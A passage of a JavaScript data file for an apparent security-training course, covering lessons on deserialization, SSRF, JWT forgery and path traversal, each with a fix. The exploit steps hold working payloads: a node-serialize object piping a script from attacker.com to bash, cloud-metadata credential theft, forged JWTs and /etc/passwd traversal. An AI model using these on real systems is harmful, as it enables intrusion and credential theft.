- Network segmentation
- Monitor command execution logs`
      }
    }
  },
  {
    id: 'insecure-deserialization',
    title: 'Insecure Deserialization',
    category: 'Server Security',
    difficulty: 'Advanced',
    duration: '20-25 min',
    description: 'Understand how insecure deserialization can lead to remote code execution and learn proper serialization practices.',
    scenario: 'An application uses serialized objects for session management. You discovered that the serialization mechanism might be vulnerable, potentially allowing attackers to execute arbitrary code by manipulating serialized data.',
    points: 225,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine how the application handles serialized session data and identify the security issue.',
        instruction: 'What is being deserialized without any validation or type checking that could contain malicious code?',
        codeExample: `// Session Handler (Node.js with node-serialize)
const serialize = require('node-serialize');

app.use((req, res, next) => {
  if (req.cookies.session) {
    // Deserialize session from cookie
    const sessionData = Buffer.from(req.cookies.session, 'base64').toString();
    req.session = serialize.unserialize(sessionData);
  }
  next();
});

// Session cookie contains Base64 encoded serialized object
// Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ==
// Decodes to: {"username":"admin","role":"user"}`,
        expectedAnswer: 'cookie',
        hint: 'The application reads data from the client (cookies) and deserializes it directly without validation. What client-controlled input is being deserialized?',
        explanation: `Insecure Deserialization Vulnerability:

**What's Happening:**
1. Session data is stored in a client-side cookie
2. Cookie is Base64 encoded, but NOT encrypted or signed
3. Server blindly deserializes whatever the client sends
4. Some serialization libraries execute code during deserialization

**Why It's Dangerous:**
- Clients can modify cookies freely
- Base64 is encoding, NOT security
- Deserialization can trigger code execution
- Attacker controls the object being reconstructed

**Attack Surface:**
- Type confusion attacks
- Object injection
- Remote Code Execution (RCE)
- Privilege escalation
- Data tampering

**OWASP Top 10 #8:**
Insecure Deserialization can lead to the most severe attacks.`
      },
      exploit: {
        title: 'Craft a Malicious Payload',
        description: 'Create a payload that exploits the deserialization vulnerability to execute code.',
        instruction: 'In JavaScript serialization exploits, what special property name triggers function execution during deserialization?',
        codeExample: `// Normal session object:
{
  "username": "user",
  "role": "user"
}

// Malicious payload (node-serialize RCE):
{
  "username": "admin",
  "role": "admin",
  "rce": {
    "???": "function(){require('child_process').exec('whoami')}"
  }
}

// The special property _$$ND_FUNC$$ tells node-serialize
// to execute this as a function during deserialization

// Payload with IIFE (Immediately Invoked):
"_$$ND_FUNC$$_function(){...}()"`,
        expectedAnswer: '_$$ND_FUNC$$',
        hint: 'node-serialize uses a special property marker that indicates a serialized function. When deserialized, it can be invoked.',
        explanation: `Deserialization Exploit Payload:

**node-serialize RCE Payload:**
const maliciousObject = {
  rce: {
    "_$$ND_FUNC$$_": "function(){require('child_process').exec('curl attacker.com/shell.sh | bash')}()"
  }
};

// Base64 encode and set as cookie
const payload = Buffer.from(serialize.serialize(maliciousObject)).toString('base64');

**Exploitation Steps:**
1. Craft malicious serialized object
2. Base64 encode the payload
3. Set as session cookie
4. Send request to application
5. Server deserializes → Code executes!

**Real-World Impacts:**
- Reverse shell access
- Data exfiltration
- Ransomware deployment
- Cryptominer installation

**Other Vulnerable Libraries:**
- Python: pickle, yaml.load()
- Java: ObjectInputStream
- PHP: unserialize()
- Ruby: Marshal.load()`
      },
      fix: {
        title: 'Implement Secure Serialization',
        description: 'Implement proper session handling that prevents deserialization attacks.',
        instruction: 'What cryptographic technique should be used to ensure session data hasn\'t been tampered with by the client?',
        codeExample: `// INSECURE:
req.session = serialize.unserialize(cookieData);

// SECURE Approach:

// 1. Never deserialize untrusted data
// 2. Use safe alternatives like JSON.parse (no code execution)
// 3. Sign session data cryptographically

const crypto = require('crypto');

// Sign session before sending
const signSession = (data, secret) => {
  const json = JSON.stringify(data);
  const signature = crypto.createHmac('sha256', secret)
    .update(json).digest('hex');
  return json + '.' + signature;
};

// Verify signature before using
const verifySession = (cookie, secret) => {
  const [json, signature] = cookie.split('.');
  const expected = crypto.createHmac('sha256', secret)
    .update(json).digest('hex');
  if (signature !== expected) throw new Error('Invalid');
  return JSON.parse(json);
};`,
        expectedAnswer: 'hmac',
        hint: 'This is a keyed-hash message authentication code that verifies both integrity and authenticity of the data.',
        explanation: `Secure Session Management:

**1. Use HMAC Signatures:**
- HMAC = Hash-based Message Authentication Code
- Combines secret key with data hash
- Tampered data won't match signature
- Server can verify authenticity

**2. Server-Side Sessions:**
// Best approach: Store sessions on server
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  cookie: { secure: true, httpOnly: true }
}));
// Cookie only contains session ID, not data

**3. Use JWT with Signature:**
const jwt = require('jsonwebtoken');

// Create signed token
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);

// Verify token
const decoded = jwt.verify(token, process.env.JWT_SECRET);

**4. Additional Measures:**
- Never use vulnerable serialization libraries
- Validate deserialized object structure
- Implement integrity checks
- Monitor for exploitation attempts`
      }
    }
  },
  {
    id: 'ssrf-attack',
    title: 'Server-Side Request Forgery (SSRF)',
    category: 'Server Security',
    difficulty: 'Advanced',
    duration: '20-25 min',
    description: 'Discover how SSRF vulnerabilities allow attackers to make requests from the server to internal resources.',
    scenario: 'An application has a feature that fetches content from URLs to generate previews. You suspect this functionality might be vulnerable to SSRF, potentially exposing internal services and cloud metadata.',
    points: 225,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine the URL preview feature and identify what makes it vulnerable to SSRF.',
        instruction: 'What is missing from this code that would prevent requests to internal/private IP addresses?',
        codeExample: `// URL Preview Endpoint
app.post('/api/preview', async (req, res) => {
  const { url } = req.body;
  
  try {
    // Fetch content from user-provided URL
    const response = await fetch(url);
    const html = await response.text();
    
    // Extract preview data
    const title = extractTitle(html);
    const description = extractDescription(html);
    const image = extractImage(html);
    
    res.json({ title, description, image });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch URL' });
  }
});

// Request: { "url": "https://example.com" }`,
        expectedAnswer: 'url validation',
        hint: 'The server will fetch ANY URL the user provides, including internal addresses. What check should be performed on the URL before making the request?',
        explanation: `SSRF Vulnerability Analysis:

**What's Wrong:**
1. No validation of the target URL
2. Server makes requests on behalf of user
3. Can access internal network resources
4. Can reach cloud metadata endpoints

**Why SSRF Is Dangerous:**
The server often has access to:
- Internal services (databases, admin panels)
- Cloud metadata (AWS 169.254.169.254)
- Localhost services (127.0.0.1)
- Private network ranges (10.x, 172.16-31.x, 192.168.x)

**Attack Targets:**
- AWS/GCP/Azure metadata APIs (credentials!)
- Internal admin dashboards
- Internal APIs without authentication
- Kubernetes service accounts
- Database connections`
      },
      exploit: {
        title: 'Exploit SSRF',
        description: 'Demonstrate how an attacker could use SSRF to access sensitive internal resources.',
        instruction: 'What is the AWS metadata IP address that attackers commonly target with SSRF to steal credentials?',
        codeExample: `// Attacker's SSRF Payloads:

// 1. Access AWS Metadata (steal credentials!)
{ "url": "http://[AWS-METADATA-IP]/latest/meta-data/iam/security-credentials/role-name" }

// 2. Port scan internal network
{ "url": "http://192.168.1.1:22" }  // Check for SSH
{ "url": "http://192.168.1.1:3306" } // Check for MySQL

// 3. Access internal admin panels
{ "url": "http://localhost:8080/admin" }
{ "url": "http://internal-dashboard.corp:3000" }

// 4. File access (if file:// allowed)
{ "url": "file:///etc/passwd" }

// 5. Cloud-specific endpoints
// GCP: http://metadata.google.internal
// Azure: http://169.254.169.254`,
        expectedAnswer: '169.254.169.254',
        hint: 'This is a link-local IP address that AWS (and other cloud providers) use to serve instance metadata. It\'s accessible from within the instance.',
        explanation: `SSRF Attack Techniques:

**AWS Metadata Exploitation:**
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

Returns: role-name

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

Returns:
{
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}

**Impact:** Full AWS access with that role's permissions!

**Bypass Techniques:**
- Decimal IP: http://2852039166 (169.254.169.254)
- Octal: http://0251.0376.0251.0376
- IPv6: http://[::ffff:169.254.169.254]
- DNS rebinding: attacker-domain.com → 169.254.169.254
- URL encoding: http://169%2e254%2e169%2e254

**Internal Network Scanning:**
- Enumerate hosts by varying IP ranges
- Discover services by port scanning
- Access internal APIs/dashboards`
      },
      fix: {
        title: 'Implement SSRF Protection',
        description: 'Implement proper validation to prevent SSRF attacks.',
        instruction: 'What type of list should be used to explicitly specify which domains/IPs are allowed to be requested?',
        codeExample: `// Secure Implementation

const dns = require('dns');
const { URL } = require('url');

// Blocked IP ranges
const blockedRanges = [
  /^127\\./, /^10\\./, /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./,
  /^192\\.168\\./, /^169\\.254\\./, /^0\\./
];

const isPrivateIP = (ip) => {
  return blockedRanges.some(range => range.test(ip));
};

const validateURL = async (urlString) => {
  const url = new URL(urlString);
  
  // Only allow http/https
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Invalid protocol');
  }
  
  // Resolve hostname to IP
  const ip = await dns.promises.resolve4(url.hostname);
  
  // Block private IPs
  if (isPrivateIP(ip[0])) {
    throw new Error('Private IPs not allowed');
  }
  
  // ??? approach: Only allow specific domains
  const allowedDomains = ['example.com', 'trusted-cdn.com'];
  if (!allowedDomains.includes(url.hostname)) {
    throw new Error('Domain not allowed');
  }
  
  return urlString;
};`,
        expectedAnswer: 'allowlist',
        hint: 'Rather than trying to block all dangerous URLs (blocklist), it\'s safer to explicitly allow only trusted destinations.',
        explanation: `Complete SSRF Protection:

**1. URL Validation:**
const validateURL = (url) => {
  const parsed = new URL(url);
  
  // Protocol check
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP(S) allowed');
  }
  
  // No explicit IPs
  if (/^\\d+\\.\\d+\\.\\d+\\.\\d+$/.test(parsed.hostname)) {
    throw new Error('Direct IPs not allowed');
  }
  
  return parsed;
};

**2. DNS Resolution Check:**
// Resolve and check IP BEFORE making request
const addresses = await dns.promises.resolve4(hostname);
for (const ip of addresses) {
  if (isPrivateIP(ip)) {
    throw new Error('Resolves to private IP');
  }
}

**3. Allowlist Approach (Safest):**
const allowedDomains = new Set([
  'example.com',
  'api.trusted-service.com'
]);

if (!allowedDomains.has(url.hostname)) {
  throw new Error('Domain not in allowlist');
}

**4. Additional Measures:**
- Disable redirects or validate each hop
- Use IMDSv2 (requires token for metadata)
- Network segmentation
- Outbound firewall rules`
      }
    }
  },
  {
    id: 'jwt-vulnerabilities',
    title: 'JWT Security Flaws',
    category: 'Authentication',
    difficulty: 'Intermediate',
    duration: '20-25 min',
    description: 'Discover common JWT implementation vulnerabilities including algorithm confusion and weak secrets.',
    scenario: 'A web application uses JWT tokens for authentication. During testing, you discovered that the JWT implementation might have critical security flaws that could allow attackers to forge tokens and gain unauthorized access.',
    points: 200,
    steps: {
      identify: {
        title: 'Identify JWT Vulnerabilities',
        description: 'Examine the JWT verification code and identify the security flaws.',
        instruction: 'What algorithm attack involves changing the JWT header to bypass signature verification?',
        codeExample: `// JWT Verification (Vulnerable)
const jwt = require('jsonwebtoken');

app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }
  
  try {
    // Vulnerable: Algorithm is read from the token itself
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
});

// JWT Token Structure:
// Header: {"alg":"HS256","typ":"JWT"}
// Payload: {"userId":1001,"role":"user","exp":1234567890}
// Signature: HMACSHA256(header + "." + payload, secret)`,
        expectedAnswer: 'none',
        hint: 'JWT supports an algorithm called "none" which means no signature is required. If the server accepts this...',
        explanation: `JWT Vulnerability Analysis:

**1. Algorithm Confusion (alg:none)**
- JWT supports "alg": "none" (no signature)
- Vulnerable libraries accept this by default
- Attacker can remove signature entirely

**2. Algorithm Switching (RS256 → HS256)**
- RS256: Asymmetric (public/private keys)
- HS256: Symmetric (shared secret)
- Attack: Sign with public key as HMAC secret

**3. Weak Secret Keys**
- Short or predictable secrets
- Secrets in code repositories
- Common secrets ("secret", "password")

**4. Missing Expiration**
- Tokens without "exp" claim
- No token revocation mechanism

**Real-World Impact:**
- Token forgery
- Privilege escalation
- Account takeover
- Bypass authentication entirely`
      },
      exploit: {
        title: 'Forge a JWT Token',
        description: 'Demonstrate how to exploit the algorithm confusion vulnerability to forge an admin token.',
        instruction: 'To perform an alg:none attack, what should you set as the JWT signature (the third part after the second dot)?',
        codeExample: `// Original Token (HS256):
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
// eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIn0.
// signature_here

// Step 1: Decode header
{"alg":"HS256","typ":"JWT"} → {"alg":"none","typ":"JWT"}

// Step 2: Modify payload
{"userId":1001,"role":"user"} → {"userId":1,"role":"admin"}

// Step 3: Re-encode (Base64URL)
// Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
// Payload: eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9

// Step 4: Set signature to [???]
// Final token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.[???]`,
        expectedAnswer: 'empty',
        hint: 'With algorithm "none", there is no signature. The third part should be left blank (but the dot separator remains).',
        explanation: `JWT Forging Techniques:

**Algorithm None Attack:**
Forged Token: header.payload.
(Note: trailing dot, empty signature)

// Python exploit
import base64
import json

header = base64.urlsafe_b64encode(
  json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b'=')

payload = base64.urlsafe_b64encode(
  json.dumps({"userId":1,"role":"admin"}).encode()
).rstrip(b'=')

forged = f"{header.decode()}.{payload.decode()}."

**Key Confusion Attack (RS256→HS256):**
1. Get the public key (often exposed)
2. Use public key as HMAC secret
3. Sign payload with HS256

# Using public key as HMAC secret
token = jwt.encode(
  {"role": "admin"}, 
  public_key,  # Using public key!
  algorithm="HS256"
)

**Weak Secret Brute Force:**
# hashcat JWT cracking
hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
      },
      fix: {
        title: 'Implement Secure JWT Handling',
        description: 'Implement proper JWT security measures to prevent token forgery.',
        instruction: 'What option should you pass to jwt.verify() to explicitly specify which algorithm(s) are allowed?',
        codeExample: `// Secure JWT Verification

const jwt = require('jsonwebtoken');

// SECURE: Explicitly specify allowed algorithms
const verifyToken = (token) => {
  return jwt.verify(token, process.env.JWT_SECRET, {
    ???: ['HS256'],  // Only allow specific algorithm
    issuer: 'myapp.com',      // Verify issuer
    audience: 'myapp-users',  // Verify audience
  });
};

// Also ensure:
// 1. Strong secret (256+ bits)
// 2. Short expiration times
// 3. Token refresh mechanism
// 4. Token revocation capability`,
        expectedAnswer: 'algorithms',
        hint: 'This option accepts an array of allowed algorithm names, preventing algorithm confusion attacks.',
        explanation: `Secure JWT Implementation:

**1. Explicit Algorithm Specification:**
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],  // ONLY allow HS256
  issuer: 'myapp.com',
  audience: 'api-users'
});

**2. Strong Secrets:**
// Generate cryptographically secure secret
const crypto = require('crypto');
const secret = crypto.randomBytes(64).toString('hex');
// Store in environment variables, never in code

**3. Short Expiration:**
const token = jwt.sign(
  payload,
  secret,
  {
    expiresIn: '15m',      // Short-lived access token
    issuer: 'myapp.com',
    audience: 'api-users'
  }
);

**4. Refresh Token Strategy:**
// Access Token: 15 minutes
// Refresh Token: 7 days (stored securely, httpOnly cookie)

**5. Token Revocation:**
// Maintain blocklist of revoked tokens
// Check against blocklist on each request
// Use short expiration to minimize blocklist size

**6. Additional Headers:**
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-id-1"  // Key ID for key rotation
}`
      }
    }
  },
  {
    id: 'path-traversal',
    title: 'Path Traversal Attack',
    category: 'Server Security',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Exploit a path traversal vulnerability to access files outside the intended directory.',
    scenario: 'A file download feature allows users to download their uploaded documents. You suspect the implementation might allow accessing files outside the uploads directory, potentially exposing sensitive server files.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine the file download endpoint and identify what makes it vulnerable to path traversal.',
        instruction: 'What characters in the filename parameter would allow an attacker to navigate to parent directories?',
        codeExample: `// File Download Endpoint
app.get('/download', isAuthenticated, (req, res) => {
  const { filename } = req.query;
  
  // Construct file path
  const filePath = path.join(__dirname, 'uploads', filename);
  
  // Check if file exists
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Example request: /download?filename=document.pdf
// File path: /app/uploads/document.pdf`,
        expectedAnswer: '../',
        hint: 'In file systems, two dots followed by a slash means "go up one directory". What if this is in the filename?',
        explanation: `Path Traversal Vulnerability:

**How It Works:**
The application constructs a file path using user input:
path.join(__dirname, 'uploads', filename)

If filename = "../../../etc/passwd"
Result: /app/uploads/../../../etc/passwd
Which resolves to: /etc/passwd

**Why path.join Doesn't Help:**
- path.join normalizes paths but doesn't prevent traversal
- It will happily join: 'uploads' + '../../../etc/passwd'
- No validation that result stays within 'uploads'

**Impact:**
- Read sensitive configuration files
- Access source code
- Retrieve /etc/passwd, /etc/shadow
- Read environment files (.env)
- Access other users' files`
      },
      exploit: {
        title: 'Access Sensitive Files',
        description: 'Craft a payload to read sensitive files from the server.',
        instruction: 'What Linux file contains a list of all system users and is commonly targeted in path traversal attacks?',
        codeExample: `// Normal request:
/download?filename=myfile.pdf

// Path traversal payloads:

// 1. Read system files
/download?filename=../../../etc/???

// 2. Access application config
/download?filename=../../.env
/download?filename=../../config/database.yml

// 3. Read source code
/download?filename=../../app.js
/download?filename=../../package.json

// 4. Encoded traversal (bypass basic filters)
/download?filename=..%2F..%2F..%2Fetc%2Fpasswd
/download?filename=....//....//etc/passwd`,
        expectedAnswer: 'passwd',
        hint: 'This file at /etc/ is world-readable and shows usernames, home directories, and shells. It\'s the classic target.',
        explanation: `Path Traversal Exploitation:

**Classic Payload:**
GET /download?filename=../../../etc/passwd

Server resolves: /app/uploads/../../../etc/passwd → /etc/passwd

**Common Target Files:**
Linux:
- /etc/passwd (user list)
- /etc/shadow (hashed passwords, if readable)
- ~/.ssh/id_rsa (SSH keys)
- /proc/self/environ (environment variables)

Windows:
- C:\\Windows\\System32\\config\\SAM
- C:\\Users\\Administrator\\.ssh\\id_rsa
- C:\\inetpub\\wwwroot\\web.config

Application:
- .env (database creds, API keys)
- config/secrets.yml
- .git/config (repo info)

**Bypass Techniques:**
- URL encoding: %2e%2e%2f = ../
- Double encoding: %252e%252e%252f
- Mixed slashes: ..\\..\\..\\
- Null bytes: ../../../etc/passwd%00.pdf`
      },
      fix: {
        title: 'Implement Secure File Access',
        description: 'Implement proper path validation to prevent directory traversal.',
        instruction: 'What path method returns the final path after resolving all ../ and removes any directory traversal?',
        codeExample: `// Secure File Download

const path = require('path');
const fs = require('fs');

app.get('/download', isAuthenticated, (req, res) => {
  const { filename } = req.query;
  const uploadsDir = path.join(__dirname, 'uploads');
  
  // Resolve to absolute path
  const filePath = path.???(uploadsDir, filename);
  
  // Verify the resolved path is within uploads directory
  if (!filePath.startsWith(uploadsDir + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Additional: validate filename
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});`,
        expectedAnswer: 'resolve',
        hint: 'This method returns an absolute path and resolves all relative components like ../ into the final path.',
        explanation: `Secure Path Handling:

**1. Use path.resolve() for Normalization:**
const uploadsDir = path.resolve(__dirname, 'uploads');
const filePath = path.resolve(uploadsDir, filename);

// Resolves ../../../etc/passwd to /etc/passwd
// Making traversal obvious

**2. Verify Path is Within Allowed Directory:**
if (!filePath.startsWith(uploadsDir + path.sep)) {
  // Traversal attempt detected!
  return res.status(403).send('Forbidden');
}

**3. Filename Validation:**
// Allow only safe characters
const safeFilename = /^[a-zA-Z0-9][a-zA-Z0-9._-]*$/;
if (!safeFilename.test(filename)) {
  return res.status(400).send('Invalid filename');
}

**4. Use Database References:**
// Instead of user-supplied filenames
// Use UUIDs and store mapping in database
const file = await db.getFile(fileId, userId);
// Returns: { id, originalName, storedPath }

**5. Additional Measures:**
- Chroot/container isolation
- Minimal file permissions
- Regular security audits`
      }
    }
  }
];
